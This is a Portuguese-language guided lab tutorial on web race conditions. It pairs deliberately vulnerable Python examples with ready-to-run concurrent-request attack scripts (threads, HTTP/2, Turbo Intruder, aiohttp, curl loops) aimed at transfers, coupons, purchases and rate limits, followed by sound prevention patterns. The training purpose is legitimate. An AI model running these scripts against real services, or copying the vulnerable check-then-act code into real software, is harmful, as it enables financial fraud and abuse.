# ⏱️ Race Conditions - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟡 Intermediário → 🔴 Avançado
**Tempo estimado**: 4-6 horas
**Pontos**: 85 (15 + 30 + 40)

### O Que Você Vai Aprender

✅ Fundamentos de race conditions
✅ Time-of-check to time-of-use (TOCTOU)
✅ Limit overrun attacks
✅ HTTP/2 multiplexing exploitation
✅ Session fixation via races
✅ Concurrent requests tooling
✅ Prevention techniques

---

## 📖 Teoria Completa

### O Que É Race Condition?

Race condition ocorre quando o comportamento de um sistema depende da sequência ou timing de eventos não controlados. Em aplicações web, isso geralmente envolve múltiplas requisições simultâneas que exploram o delay entre verificação e ação.

### Time-of-Check to Time-of-Use (TOCTOU)

```python
# VULNERÁVEL ❌
def transfer_money(from_user, to_user, amount):
    # 1. CHECK: Verifica saldo
    balance = get_balance(from_user)
    if balance >= amount:
        # 2. Delay aqui permite race!
        time.sleep(0.001)

        # 3. USE: Transfere
        deduct_balance(from_user, amount)
        add_balance(to_user, amount)
```

**Exploit:** Envie 2 requisições simultâneas:
- Request 1: Transfere $100 (balance=$100)
- Request 2: Transfere $100 (balance=$100)
- Ambas passam no CHECK!
- Resultado: Transferiu $200 com saldo de $100

---

## 🎯 Tipos de Race Conditions

### 1. Limit Overrun

```python
# VULNERÁVEL ❌
def use_coupon(user, coupon_code):
    # CHECK: Cupom válido?
    if is_coupon_valid(coupon_code) and get_coupon_usage(coupon_code) < 1:
        # Race aqui!
        apply_discount(user)
        increment_coupon_usage(coupon_code)
```

**Exploit:** Use mesmo cupom múltiplas vezes simultaneamente.

### 2. Double Spending

```python
# VULNERÁVEL ❌
def purchase(user, item_id):
    # CHECK: Créditos suficientes?
    if user.credits >= item.price:
        # Race!
        user.credits -= item.price
        give_item(user, item_id)
```

**Exploit:** Compre 2 itens ao mesmo tempo com créditos para apenas 1.

### 3. Session Fixation

```python
# VULNERÁVEL ❌
def login(username, password):
    if verify_password(username, password):
        session_id = generate_session()
        # Race entre gerar e associar!
        associate_session(username, session_id)
        return session_id
```

### 4. File Write Race

```python
# VULNERÁVEL ❌
def save_file(user, filename, content):
    filepath = f'/uploads/{user.id}/{filename}'

    # CHECK: Arquivo não existe?
    if not os.path.exists(filepath):
        # Race!
        with open(filepath, 'w') as f:
            f.write(content)
```

**Exploit:** Sobrescreva arquivo via race.

---

## 💣 Exploitation Techniques

### 1. Concurrent Requests (Python)

```python
import requests
import threading

URL = 'http://target.com/api/transfer'
DATA = {'to': 'attacker', 'amount': 100}

def send_request():
    response = requests.post(URL, json=DATA, cookies={'session': 'abc123'})
    print(response.status_code, response.text)

# Lança 10 threads simultâneas
threads = []
for i in range(10):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### 2. HTTP/2 Multiplexing

HTTP/2 permite múltiplas requisições na mesma conexão TCP, tornando races mais fáceis!

```python
import httpx

async with httpx.AsyncClient(http2=True) as client:
    tasks = [
        client.post('http://target.com/api/action', json=data)
        for _ in range(20)
    ]
    responses = await asyncio.gather(*tasks)
```

### 3. Burp Suite Repeater

1. Capture request in Burp
2. Send to Repeater (Ctrl+R)
3. Duplicate tab 20x
4. Clique direito → "Send group in parallel (single-packet attack)"

### 4. Turbo Intruder (Burp Extension)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,
        requestsPerConnection=100,
        pipeline=False
    )

    for i in range(50):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

---

## 🧪 Cenários Reais

### 1. Discount Code Abuse

```
Cenário: Loja online com cupons de 1 uso

Exploit:
1. Adicione item ao carrinho ($100)
2. Aplique cupom 50OFF (50% desconto)
3. Envie 10 "checkout" requests simultâneas
4. Sistema aplica desconto múltiplas vezes!
5. Pague $0 por item de $100
```

### 2. Rate Limit Bypass

```python
# Rate limit: 10 requests/segundo
# Mas verifica APÓS processar!

# VULNERÁVEL ❌
def api_endpoint():
    process_request()  # Processa primeiro
    increment_rate_limit()  # Incrementa depois

    if get_rate_limit() > 10:
        return 'Rate limit exceeded', 429
```

**Exploit:** Envie 100 requests simultâneas antes do rate limit ser aplicado.

### 3. Promo Code Stacking

```
Cenário: Site permite 1 cupom por pedido

Exploit:
1. Aplique cupom CODE1 (20% off)
2. Aplique cupom CODE2 (30% off) simultaneamente
3. Se race condition, ambos aplicados!
4. Total: 50% off ao invés de apenas 30%
```

### 4. Vote/Like Manipulation

```python
# VULNERÁVEL ❌
def upvote_post(post_id, user_id):
    # CHECK: Já votou?
    if not has_voted(user_id, post_id):
        # Race!
        increment_votes(post_id)
        mark_as_voted(user_id, post_id)
```

**Exploit:** Vote múltiplas vezes simultaneamente.

---

## 🛠️ Ferramentas

### 1. race-the-web

```bash
# Instalar
go get github.com/aaronjanse/race-the-web

# Uso
race-the-web -u http://target.com/api/action \
  -c 50 \
  -r 100 \
  -d '{"action":"buy","item_id":123}'
```

### 2. Python Script Custom

```python
#!/usr/bin/env python3
import asyncio
import aiohttp

async def send_request(session, url, data):
    async with session.post(url, json=data) as response:
        text = await response.text()
        print(f"Status: {response.status} - {text[:100]}")

async def race_attack(url, data, count=50):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data) for _ in range(count)]
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    url = 'http://target.com/api/transfer'
    data = {'to': 'attacker', 'amount': 1000}
    asyncio.run(race_attack(url, data, count=100))
```

### 3. Bash + cURL

```bash
#!/bin/bash
URL="http://target.com/api/action"
DATA='{"action":"withdraw","amount":100}'

# Lança 20 requests em paralelo
for i in {1..20}; do
  curl -X POST "$URL" \
    -H "Content-Type: application/json" \
    -d "$DATA" \
    -b "session=abc123" &
done

wait
```

---

## 🛡️ Prevenção

### 1. Database Transactions

```python
# CORRETO ✅
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

def transfer_money(from_user_id, to_user_id, amount):
    session = Session()
    try:
        # Começa transação
        session.begin()

        # Lock na linha do banco!
        from_user = session.query(User).filter_by(id=from_user_id).with_for_update().first()

        if from_user.balance >= amount:
            from_user.balance -= amount
            to_user = session.query(User).filter_by(id=to_user_id).first()
            to_user.balance += amount

            session.commit()
            return True
        else:
            session.rollback()
            return False

    except Exception as e:
        session.rollback()
        raise e
```

### 2. Atomic Operations

```python
# CORRETO ✅
import redis

r = redis.Redis()

def use_coupon(user_id, coupon_code):
    # Incrementa atomicamente e verifica
    usage = r.incr(f'coupon:{coupon_code}:usage')

    if usage == 1:  # Primeiro uso!
        apply_discount(user_id)
        return True
    else:
        r.decr(f'coupon:{coupon_code}:usage')  # Reverte
        return False
```

### 3. Distributed Locks (Redis)

```python
# CORRETO ✅
import redis
from redis.lock import Lock

r = redis.Redis()

def critical_operation(user_id):
    lock = Lock(r, f'lock:user:{user_id}', timeout=5)

    if lock.acquire(blocking=False):
        try:
            # Operação crítica aqui
            process_operation(user_id)
        finally:
            lock.release()
    else:
        return 'Operation already in progress', 409
```

### 4. Idempotency Keys

```python
# CORRETO ✅
def process_payment(payment_data, idempotency_key):
    # Verifica se já processado
    if redis.exists(f'payment:{idempotency_key}'):
        return redis.get(f'payment:{idempotency_key}')

    # Processa
    result = charge_card(payment_data)

    # Armazena resultado
    redis.setex(f'payment:{idempotency_key}', 3600, result)

    return result
```

### 5. Rate Limiting ANTES de Processar

```python
# CORRETO ✅
def api_endpoint(user_id):
    # Verifica rate limit PRIMEIRO!
    if get_rate_limit(user_id) >= 10:
        return 'Rate limit exceeded', 429

    increment_rate_limit(user_id)

    # Processa request
    return process_request()
```

---

## 🎯 Estrutura do Laboratório

### 1. 🟢 Basic App (15 pontos)
- **Porta**: 5110
- **Cenário**: E-commerce simples
- Limit overrun em cupons
- Double spending em compras
- Rate limit bypass

### 2. 🟡 Intermediate App (30 pontos)
- **Porta**: 5111
- **Cenário**: Banking app
- TOCTOU em transferências
- Session fixation
- Concurrent vote manipulation

### 3. 🔴 Advanced App (40 pontos)
- **Porta**: 5112
- **Cenário**: Trading platform
- HTTP/2 race exploitation
- Distributed system races
- Complex timing attacks

---

## 📝 Checklist de Conclusão

- [ ] Entendi conceito de race conditions
- [ ] Explorei TOCTOU vulnerability
- [ ] Executei limit overrun attack
- [ ] Bypassei rate limiting com races
- [ ] Executei double spending
- [ ] Usei HTTP/2 para facilitar races
- [ ] Implementei database locking
- [ ] Usei Redis para distributed locks
- [ ] Implementei idempotency keys
- [ ] Completei todos os exercícios

**Total**: 85 pontos

---

## 🎓 Próximos Passos

Após dominar Race Conditions:

1. **Distributed Systems Race Conditions**
2. **Microservices Race Exploitation**
3. **Blockchain Re-entrancy Attacks**
4. **Advanced Timing Attacks**

---

**Parabéns! Você completou todos os 11 laboratórios! 🎉**

**Voltar**: [← Index](../README.md)

---

**Boa sorte e happy hacking! ⏱️**
